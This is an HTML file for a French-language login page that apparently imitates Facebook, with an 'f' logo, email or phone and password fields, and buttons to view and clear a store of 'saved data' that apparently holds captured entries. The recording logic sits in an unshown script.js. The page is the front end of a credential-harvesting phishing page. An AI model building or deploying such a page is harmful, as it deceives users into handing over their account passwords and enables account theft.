<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="language">Français (France)</div>
            
            <div class="logo">
                <div class="logo-circle">
                    <span class="logo-text">f</span>
                </div>
            </div>
            
            <form id="loginForm" class="login-form">
                <div class="input-group">
                    <input 
                        type="text" 
                        id="email" 
                        class="input-field" 
                        placeholder="numéro mobile ou e-mail"
                        required
                    >
                </div>
                
                <div class="input-group">
                    <input 
                        type="password" 
                        id="password" 
                        class="input-field" 
                        placeholder="mot de passe"
                        required
                    >
                </div>
                
                <button type="submit" class="login-btn">
                    Se connecter
                </button>
            </form>
            
            <div id="message" class="message"></div>
            
            <div class="actions">
                <button id="showData" class="action-btn">
                    Voir les données enregistrées
                </button>
                <button id="clearData" class="action-btn clear-btn">
                    Effacer la base de données
                </button>
            </div>
        </div>
        
        <div id="dataModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2>Données enregistrées</h2>
                    <span class="close">&times;</span>
                </div>
                <div id="dataList" class="data-list"></div>
            </div>
        </div>
    </div>
    
    <script src="script.js"></script>
</body>
</html>
